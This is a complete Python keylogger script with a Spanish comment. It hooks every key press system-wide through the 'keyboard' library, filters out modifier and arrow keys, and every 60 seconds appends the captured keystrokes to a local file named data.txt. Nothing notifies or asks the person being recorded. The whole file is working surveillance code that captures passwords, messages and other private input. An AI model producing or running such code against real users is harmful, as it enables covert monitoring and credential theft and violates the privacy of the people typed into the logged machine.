# pip install keyboard
import threading

import keyboard

key_buffer = []
buffer_lock = threading.Lock()

# Lista de teclas especiales que NO quieres guardar
IGNORED_KEYS = {
    "shift", "ctrl", "alt", "caps lock", "backspace",
    "tab", "enter", "esc", "up", "down", "left", "right"
}

def pressedKeys(key):
    with buffer_lock:
        if key.name == "space":
            key_buffer.append(" ")
        elif key.name not in IGNORED_KEYS:
            key_buffer.append(key.name)

def write_buffer_to_file():
    global key_buffer
    threading.Timer(60.0, write_buffer_to_file).start()

    with buffer_lock:
        if not key_buffer:
            return

        with open("data.txt", "a", encoding="utf-8") as file:
            file.write("".join(key_buffer))
        
        key_buffer.clear()

write_buffer_to_file()
keyboard.on_press(pressedKeys)
keyboard.wait()